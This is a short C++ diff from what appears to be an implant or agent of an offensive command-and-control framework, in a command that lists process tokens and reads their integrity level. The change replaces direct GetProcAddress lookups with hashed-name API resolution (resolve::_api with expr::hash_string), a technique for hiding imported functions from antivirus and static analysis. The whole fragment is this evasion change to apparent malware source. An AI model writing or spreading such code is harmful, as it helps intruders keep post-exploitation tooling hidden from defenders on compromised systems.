@@ -107,13 +107,13 @@ auto declfn starburst::cmd_token_list(
                         typedef PUCHAR ( WINAPI *fn_GetSidSubAuthorityCount )( PSID );
                         typedef PDWORD ( WINAPI *fn_GetSidSubAuthority )( PSID, DWORD );
                         auto pGSSAC = reinterpret_cast<fn_GetSidSubAuthorityCount>(
-                            inst.kernel32.GetProcAddress(
-                                (HMODULE)inst.advapi32.handle,
-                                symbol<LPCSTR>( "GetSidSubAuthorityCount" ) ) );
+                            resolve::_api(
+                                reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
+                                expr::hash_string( "GetSidSubAuthorityCount" ) ) );
                         auto pGSSA = reinterpret_cast<fn_GetSidSubAuthority>(
-                            inst.kernel32.GetProcAddress(
-                                (HMODULE)inst.advapi32.handle,
-                                symbol<LPCSTR>( "GetSidSubAuthority" ) ) );
+                            resolve::_api(
+                                reinterpret_cast<uintptr_t>( (HMODULE)inst.advapi32.handle ),
+                                expr::hash_string( "GetSidSubAuthority" ) ) );
                         if ( pGSSAC && pGSSA ) {
                             auto sub_count = *pGSSAC( tml->Label.Sid );
                             if ( sub_count > 0 ) {
